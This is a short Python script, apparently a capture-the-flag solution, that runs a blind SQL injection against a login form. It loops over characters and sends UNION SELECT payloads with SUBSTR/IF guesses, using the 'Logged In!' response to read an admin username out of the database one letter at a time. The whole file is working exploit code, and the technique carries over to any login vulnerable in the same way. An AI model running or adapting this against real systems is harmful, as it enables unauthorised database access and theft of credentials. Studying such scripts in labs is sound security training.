import requests

tested_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-,.!/^#$ "
password = "true"
# This needs to be changed to your challenge instance
url = "http://add.your.ip.address/containertag/login"


def get_blind_query(query):
    print(f"Performing blind query: {query}")
    result = ""
    pos = 1
    go_on = True
    while go_on:
        correct = False
        for letter in tested_chars:
            username = get_user_string(query, pos, letter)
            r = requests.post(url, data={"username": username, "password": password})
            correct = "Logged In!" in str(r.content)
            if correct:
                print(letter)
                result += letter
                pos += 1
                break
        go_on = correct
    print("\nDone.")
    return result


def get_user_string(query, pos, guess):
    return f"1' UNION SELECT IF(BINARY SUBSTR(({query}), {pos}, 1) = '{guess}', 'true', 'false');--"


def main():
    query = "SELECT username FROM admins LIMIT 1"
    print(f"Result is: {get_blind_query(query)}")


if __name__ == '__main__':
    main()
